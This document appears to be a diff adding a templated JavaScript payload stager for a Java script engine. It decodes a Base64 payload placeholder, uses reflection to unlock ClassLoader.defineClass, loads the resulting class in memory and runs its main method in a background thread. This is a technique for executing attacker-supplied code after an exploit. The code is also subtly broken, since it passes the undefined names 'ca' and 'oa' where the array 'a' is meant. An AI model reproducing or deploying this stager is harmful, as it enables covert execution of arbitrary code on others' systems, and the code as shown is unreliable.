@@ -1,0 +1,22 @@
+var BASE64 = "${[BASE64PAYLOAD|"+
+  "|]}";
+var DATA = new Packages.sun.misc.BASE64Decoder().decodeBuffer(BASE64);
+var ldr = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.net.URL, 0));
+var a = java.lang.reflect.Array.newInstance(java.lang.Class, 3);
+a[0] = java.lang.Class.forName("[B");
+a[1] = java.lang.Integer.TYPE;
+a[2] = java.lang.Integer.TYPE;
+var m = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", ca);
+m.setAccessible(true);
+a = java.lang.reflect.Array.newInstance(java.lang.Object, 3);
+a[0] = DATA;
+a[1] = new java.lang.Integer(0);
+a[2] = new java.lang.Integer(DATA.length);
+var c = m.invoke(ldr, oa);
+a = java.lang.reflect.Array.newInstance(java.lang.Class, 1);
+a[0] = java.lang.Class.forName("[Ljava.lang.String;");
+m = c.getMethod("main",a);
+a = java.lang.reflect.Array.newInstance(java.lang.Object, 1);
+a[0] = java.lang.reflect.Array.newInstance(java.lang.String, 0);
+var r = new java.lang.Runnable({ run: function() { m.invoke(null, a); }});
+new java.lang.Thread(r).start();
